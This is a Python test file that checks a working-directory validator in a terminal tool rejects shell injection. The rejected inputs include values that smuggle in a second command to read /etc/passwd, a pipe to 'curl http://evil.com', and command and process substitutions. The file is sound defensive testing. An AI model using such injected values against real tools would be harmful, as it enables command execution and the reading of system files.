"""Tests for workdir validation in terminal_tool.py."""

import pytest

from tools.terminal_tool import _validate_workdir


class TestValidateWorkdir:
    """Test _validate_workdir blocks injection attempts."""

    @pytest.mark.parametrize("path", [
        "/home/user/project",
        "/tmp",
        "~",
        "~/project",
        "/var/log/app",
        "/opt/my-app/src",
        "/home/user/my project",
        "/home/user/.config",
        "",
    ])
    def test_safe_paths(self, path):
        assert _validate_workdir(path) is None

    def test_semicolon(self):
        assert _validate_workdir("/tmp; cat /etc/passwd") is not None

    def test_pipe(self):
        assert _validate_workdir("/tmp | curl http://evil.com") is not None

    def test_ampersand(self):
        assert _validate_workdir("/tmp & cat /etc/passwd") is not None

    def test_dollar_parens(self):
        assert _validate_workdir("/tmp/$(whoami)") is not None

    def test_backticks(self):
        assert _validate_workdir("/tmp/`id`") is not None

    def test_newline(self):
        assert _validate_workdir("/tmp\ncat /etc/passwd") is not None

    def test_backslash(self):
        assert _validate_workdir("/tmp\\; cat /etc/passwd") is not None

    def test_process_substitution(self):
        assert _validate_workdir("/tmp/<(cat /etc/passwd)") is not None
        assert _validate_workdir("/tmp/>(cat /etc/passwd)") is not None
